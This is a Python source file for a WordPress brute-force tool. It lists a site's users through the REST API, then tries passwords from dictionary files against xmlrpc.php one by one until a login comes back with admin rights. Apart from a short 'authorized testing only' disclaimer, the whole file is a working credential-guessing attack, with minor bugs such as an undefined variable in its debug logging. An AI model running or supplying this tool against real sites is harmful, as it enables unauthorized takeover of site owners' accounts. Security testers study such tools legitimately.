"""
This script is for educational and authorized testing only.
Unauthorized access to systems you do not own is illegal.

Author assumes no liability for any misuse or damage.
"""

import requests
import urllib3
import json
import sys
import utils
from utils import die, dump
from configuration import getConf
import glob
import time


# Remove unnesseray warning related to certificate
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class BruteForcer:

    domain = ''
    verify = not getConf('dev.ignoreCertificate')  # Useful for local testing.

    def __init__(self, domain):
        self.domain = utils.normalize_domain(domain)
    

    # Handles the all the logic
    # from various checks, retrieving the users and performing the bruteforcing...
    def run(self):

        if not self.check_domain():
            print('❌ It seems the domain is wong, or the API / XMLRPC is not available.')
            die()
    
        userlist = self.get_user_list()
        if len(userlist) == 0:
            print(f"❗ No users found for {self.domain}. Terminating.")
            die()
        else:
            print('🌟 Found a total of '+ str(len(userlist)) +' user(s):')
            
        for user in userlist:
            # we use "slug" which is more likeky the username 
            # while "name" can be customized to be, for example, firstname + lastname
            self.begin_bruteforce(user['slug'])


    
    # Returns True if the wordpress rest API is available for the given website, false otherwise.
    # TODO: For the fun, add some verification other than status_code != 200 :)
    def check_domain(self):
    
        url_api = f"{self.domain}/wp-json"
        url_xmlrpc = f"{self.domain}/xmlrpc.php"

        # Check if API is available first
        try:
            print(f"Testing url rest API...", end=" ")
            response_api = requests.get(url_api, timeout=5, verify=self.verify)
            if response_api.status_code == 200:
                print('✅ OK')
            else:
                return False
        except requests.exceptions.RequestException as e:
            print(e)
            return False
    
        # Then check if XMLRPC is available too
        try:
            print(f"Now testing url XMLRPC...", end=" ")
            response_xmlrpc = requests.post(url_xmlrpc, timeout=5, verify=self.verify) # xmlrpc uses only POST.
            if response_xmlrpc.status_code == 200:
                print('✅ OK')
            else:
                return False
        except requests.exceptions.RequestException as e:
            print(e)
            return false
    
        return True
    

    # Returns the list of users of the given website, interrogating the WP rest API.
    def get_user_list(self):
        url = f"{self.domain}/wp-json/wp/v2/users"
    
        try:
    
            # Try to get user list
            print(f"\nRetrieving user list...", end=" ")
            response = requests.get(url, timeout=5, verify=self.verify)
    
            #print(f"\n[GET] {url}")
            #print(f"Status Code: {response.status_code}")
            #print(f"Headers: {response.headers}")
            #print(f"Body (truncated):\n{response.text[:200]}")
        except requests.exceptions.RequestException as e:
            print(e)
            return []
    
        if response.status_code != 200:
            print('❌ Server did not respond status 200.')
            return []
    
        # At this point we have correctly recieved a response from the API
        # Lets read the json response
        try:
            userList = json.loads(response.text)
            print(f"Done!")
        except (json.JSONDecodeError, ValueError):
            print("❌ Response is not valid JSON.")
            userList = []
    
        return userList
    

    def begin_bruteforce(self, username):
        print(f"Begining the bruteforce for user {username}...")

        # empty the file before testing
        if getConf('dev.debugmode') == True:
            with open("log/requests.log", "w", encoding="utf-8") as file:
                file.write("")

        files = glob.glob("dictionnaries/*.txt")
        if len(files) <= 0:
            print("❌ Error - No dictionnary found. Please prodive at least one!")
            die()

        # We read the available dictionnaries
        time_start = time.time()
        for file_path in files:
            print(f"Reading {file_path}")
            
            # We read lines one by one to avoid loading entire huge files that can cause memory issues
            passwords_tested = 0 # we test multiple passwords at once for performance
            passwords_set = [] # we test multiple passwords at once for performance
            found = False
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                for line in file:
                    word = line.strip()
                    if word:
                        # we test the password
                        found = self.testPassword(username, word)
                        passwords_tested = passwords_tested + 1

                    # Some logging...
                    if time.time() - time_start >= 3:
                        print('.')
                        time_start = time.time()

                    if passwords_tested % 50 == 0:
                        print(f"Tested {passwords_tested} passwords so far")
                

    # Usus xmlrpc to check if a given password works for a given user.
    # BTW, Wordpress has a python library: xmlrpc.client but FI
    # NOTE: cannot use system.multicall because the behaviour of Wordpress using system.multicall is 
    # "quirky" since if the first authentication in the stack fails, wordpress assumes it will fail for the rest of the stack!
    # which mean litteraly: if 1st test is false then all batch is false QQ
    # So we must perform an authentication one by one.
    def testPassword(self, username, password):
        url_xmlrpc = f"{self.domain}/xmlrpc.php"

        # Build XML-RPC payload
        request_body = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param>
                    <value><string>{username}</string></value>
                </param>
                <param>
                    <value><string>{password}</string></value>
                </param>
            </params>
        </methodCall>
        """

        response = requests.post(
            url_xmlrpc,
            data=request_body.strip(),
            headers={'Content-Type': 'text/xml'},
            timeout=5,
            verify=self.verify
        )

        # Log the reponses
        if getConf('dev.debugmode') == True:
            with open("log/requests.log", "a", encoding="utf-8") as file:
                file.write("Results for passwords:"+' '.join(passwords)+"\n")
                file.write("<=============== REQUEST BODY ===============>\n")
                file.write(f"{request_body}\n")
                file.write("<=============== END REQUEST BODY - START RESPONSE BODY ===============>\n")
                file.write(response.text)
                file.write("<=============== END RESPONSE BODY ===============>\n\n\n")

        # TODO: better handling. Ideally wait and retry but FI.
        if response.status_code != 200:
            return False

        if '<name>isAdmin</name>' in response.text:
            print(f"✅ SUCCESS → The password '{password}' is valid for the user '{username}' !")
            die()

        return False
        